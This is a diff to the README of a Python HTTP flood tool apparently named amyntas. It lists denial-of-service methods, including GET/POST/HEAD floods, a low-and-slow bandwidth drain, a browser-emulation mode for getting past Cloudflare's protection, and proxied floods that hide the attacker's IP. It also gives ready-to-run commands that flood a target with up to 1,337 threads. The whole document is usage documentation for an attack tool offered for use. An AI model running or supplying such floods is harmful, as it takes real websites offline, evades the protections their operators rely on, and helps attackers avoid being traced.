@@ -18,18 +18,18 @@ Aviable methods
 - `GHP`/`GETHEADPOST` (a flood which randomly chooses GET, HEAD or POST as request method)
 - `LEECH` (a low & slow HTTP GET flood which can drain A LOT of bandwith)
 - `MIX` (a method which randomly chooses HTTP request methods)
-- `BYPASS` (bypasses cloudflare)
-- `PROXY` (attack which uses a proxy file to attack)
+- `BYPASS` (method which uses browser emulation to get a cookie which will be used to bypass services like Cloudflare)
+- `PROXY` (GET flood which hides its IP using a specified proxy list)
 
 ---
 
 ### Features
-1. Proxy scraper
+1. Proxy scraper & checker
 2. Cache bypassing mechanisms
 3. Random headers (user agents, referers)
 4. Real time "worker" system
 5. Supports custom user-agent and referer
-6. Proxy support (Rotating proxy support coming soon!)
+6. Proxy support (Rotating proxy aswell `--rotate-proxy <file with proxies>`)
 
 ---
 
@@ -43,6 +43,7 @@ Aviable methods
 2. More documentation
 3. Better exception handling
 4. Maybe colors? lol
+5. Better debugging (it's shit atm)
 
 ---
 
@@ -50,7 +51,7 @@ Aviable methods
 All options:
 ```
 -h, --help                             Show this help message and exit
--t TARGET, --target TARGET             Target URL (Example: https://google.com or http://pornhub.com)
+-t TARGET, --target TARGET             Target URL (Example: https://google.com or http://yandex.ru)
 -p PORT, --port PORT                   Target port (Leave empty to let the tool decide)
 -d DURATION, --duration DURATION       Attack duration
 --proxy-file FILE_PATH                 Path to proxies
@@ -87,14 +88,19 @@ POST flood, attacking with 700 threads for 40 seconds:
 python3 amyntas.py -t https://target.com -w 700 -m POST -d 40
 ```
 
-Proxified GET flood using a file with SOCKS5 proxies, with 1337 threads for 40 seconds
+Proxified PROXY/GET flood using a file with SOCKS5 proxies, with 1337 threads for 40 seconds:
 ```
 python3 amyntas.py --proxy-file socks5.txt --proxy-type SOCKS5 -t https://target.com -w 1337 -d 40 -m PROXY
 ```
 
-Raw GET flood, using HTTP protocol version 430 with 999 threads for 999 seconds
+Raw GET flood, using HTTP protocol version 430 with 999 threads for 999 seconds:
 ```
 python3 amyntas.py --http-version 430 -m GET -w 999 -d 999 -t https://target.com:420
+```
+
+GET flood that bypasses Cloudflare's UAM mode:
+```
+python3 amyntas.py -t https://target.com -w 200 -d 100 -m BYPASS --proxy-file socks5.txt
 ```
 
 ---
